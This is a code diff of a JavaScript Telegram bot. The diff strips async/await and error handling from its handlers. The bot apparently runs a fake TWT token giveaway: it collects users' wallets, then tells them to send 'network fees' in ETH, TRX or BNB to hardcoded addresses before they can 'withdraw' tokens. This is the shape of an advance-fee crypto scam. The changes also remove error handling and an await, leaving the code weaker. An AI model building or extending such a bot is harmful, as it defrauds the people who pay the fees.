@@ -3,9 +3,8 @@ const fs = require('fs');
 
 
 
-async function startFuntion(chat){
-     try {
-                
+ function startFuntion(chat){
+                     
         let caption;
         let keyboard;
         let keyboardJSON;
@@ -45,17 +44,12 @@ async function startFuntion(chat){
           urlType: `sendPhoto`
         }
 
-
-     } catch (err) {
-        console.log(err);
-     }
 }
 
 
 
-async function JoinGroupFunction(chat){
-    try {
-
+ function JoinGroupFunction(chat){
+   
         let caption;
         let keyboard;
         let keyboardJSON;
@@ -82,15 +76,12 @@ async function JoinGroupFunction(chat){
           formData,
           urlType: `sendPhoto`
         }
-    } catch (err) {
-        console.log(err);
-    }
+   
 }
 
 
-async function submitWallet(chat){
-    try {
-
+ function submitWallet(chat){
+  
         let caption;
        
         const formData = new FormData();
@@ -101,19 +92,17 @@ async function submitWallet(chat){
             formData.append('photo', fs.createReadStream('./image3.jpg'));
             formData.append('caption', caption);
 
-           await client.set(`${chat?.first_name}`, "/walletSubmit"); 
+            client.set(`${chat?.first_name}`, "/walletSubmit"); 
 
             return  {
             formData,
             urlType: `sendPhoto`
             }
 
-    } catch (err) {
-        console.log(err);
-    }
+   
 }
 
-async function submitWalletComplete(chat){
+ function submitWalletComplete(chat){
 
 
                 let text;
@@ -144,8 +133,8 @@ async function submitWalletComplete(chat){
 
 }
 
-async function withdrawFunction(chat){
-    try {
+ function withdrawFunction(chat){
+   
         let caption;
        
         let keyboard;
@@ -180,14 +169,11 @@ async function withdrawFunction(chat){
             urlType: `sendPhoto`
             }
 
-    } catch (err) {
-        console.log(err)
-    }
 }
 
 
-async function ethGasFee(chat){
-    try {
+ function ethGasFee(chat){
+   
         const text = " 📝 Please Send 0.009 ETH as Ethereum (ERC20) network fee for withdraw your TWT Tokens.\n\n"+
                      "Address :- 0x1Eebc95ac5945C467a9c73Aa0b527137983595fE \n\n"+
                      "Send: 0.009 ETH \n\n"+
@@ -207,16 +193,12 @@ async function ethGasFee(chat){
                     urlType: 'sendMessage'
                 }
 
-    } catch (err) {
-        console.log(err);
-    }
+  
 }
 
 
-async function trxGasFee(chat){
-    try {
-
-
+ function trxGasFee(chat){
+   
         const text = " 📝 Please Send 230 TRX as Tron (TRC20) network fee for withdraw your TWT Tokens.\n\n"+
                      "Address :-TPFDpdFrMndJD8ZwhKC9joZ22pGyCgPzvJ \n\n"+
                      "Send: 230 TRX \n\n"+
@@ -236,14 +218,10 @@ async function trxGasFee(chat){
                     urlType: 'sendMessage'
                 }
 
-    } catch (err) {
-        console.log(err);
-    }
+   
 }
 
-async function bnbGasFee(chat){
-    try {
-
+ function bnbGasFee(chat){
 
         const text = " 📝 Please Send 0.05 BNB Smart Chain as BNB (BEP20) network fee for withdraw your TWT Tokens. \n\n"+
                      "Address :- bnb1e3tpnrmlft3eaqdrg9kalwwtq93a8p45r350a3 \n\n"+
@@ -263,10 +241,7 @@ async function bnbGasFee(chat){
                     reply_markup: keyboardJSON,
                     urlType: 'sendMessage'
                 }
-
-    } catch (err) {
-        console.log(err);
-    }
+                
 }
 
 
